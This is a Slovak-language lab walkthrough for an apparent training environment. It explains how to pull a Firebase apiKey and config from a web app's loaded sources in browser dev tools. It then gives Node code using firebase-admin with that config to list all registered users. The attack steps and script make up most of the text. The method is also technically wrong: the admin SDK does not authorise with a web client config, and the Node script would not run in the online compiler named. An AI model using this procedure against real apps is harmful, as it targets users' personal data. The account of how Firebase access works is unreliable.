# Sensitive data exposure 

### Prostredie: Dp-Test-Enviroment - https://github.com/MatusVetrik/dp-test-enviroment

- Cieľom útoku je odhlaiť citlivé údaje napisané v kóde. Zasústredíme sa na API kľúče, pomocou ktorých sprístupnujeme služby používané aplikáciou.
- Klávesou F12 si vieme otvoriť vývojársku konzolu. Preklikneme sa na položku "Sources", kde vidíme všetky zdrojové kódy, ktoré boli pri načítané.
- Postupne môžeme prechádzať súbor po súbore a hľadať citlivé údaje. Jedným z nich môže byť napríklad API key, ktorý je v podstate prístupový kľúč ku danej službe. Nás v tomto prípade
  bude zaujímať prístupový kľúč ku Firebase API, vďaka ktorému budeme môcť získať údaje uložené vo Firebase účte vývojára aplikácie alebo vlastníka aplikácie.
- Kliknime na ľubovoľný súbor a kombináciou kláves Ctrl + F vyhľadáme kľúčové slovo v súbore. Skúsime vyhľadať "apiKey" a postupne prechádzať jednotlivé súbory kým nenájdeme zhodu.
- Konfiguračný objekt môže vyzerať nasaledovne:

      const firebaseConfig = {
              apiKey: "AIzaayCx_tvo5GYYtbjFgSsbGtQv7TWb6mreZWg",
              authDomain: "test-app.firebaseapp.com",
              projectId: "test-app",
              storageBucket: "test-app.appspot.com",
              messagingSenderId: "548553603022",
              appId: "1:548553604021:web:6628aba44c524cbf19cf69",
            };
- 
- Zhoda bola nájdená v súbore auth.js a nachádza sa tu celá konfigurácia pre použitie služby.
- Teraz si môžeme vytvoriť vlastný kód a zavolať ľubovoľné metódy z API a sprístupniť dáta o zaregistrovaných používateľoch.
  ```
  const admin = require("firebase-admin");
    
  const firebaseConfig = {
            apiKey: "AIzaayCx_tvo5GYYtbjFgSsbGtQv7TWb6mreZWg",
            authDomain: "test-app.firebaseapp.com",
            projectId: "test-app",
            storageBucket: "test-app.appspot.com",
            messagingSenderId: "548553603022",
            appId: "1:548553604021:web:6628aba44c524cbf19cf69",
          };
    
  admin.initializeApp(firebaseConfig); 
  const auth = admin.auth();
  
  async function getAllUsers() {
    try {
      const userList = await auth.listUsers();
      userList.users.forEach(userRecord => {
        console.log("User: ", userRecord);
      });
    } catch (error) {
      console.error("Error fetching users:", error);
    }
  }

  getAllUsers();
    ```

- Teraz môžeme spustiť kód v online javascript prostredí https://www.programiz.com/javascript/online-compiler/. nahraden9m firebaseConfig objektu a spustením získame údaje o všetkých používateľoch zaregistrovaných v aplikácii.
- Video návod sa nachádza v priečinku "video_instructions": /video_instructions/sensitive-data-exposure-apikey.mp4 (https://github.com/MatusVetrik/dp-attacks-instructions/blob/main/video_instructions/sensitive-data-exposure-apikey.mp4)
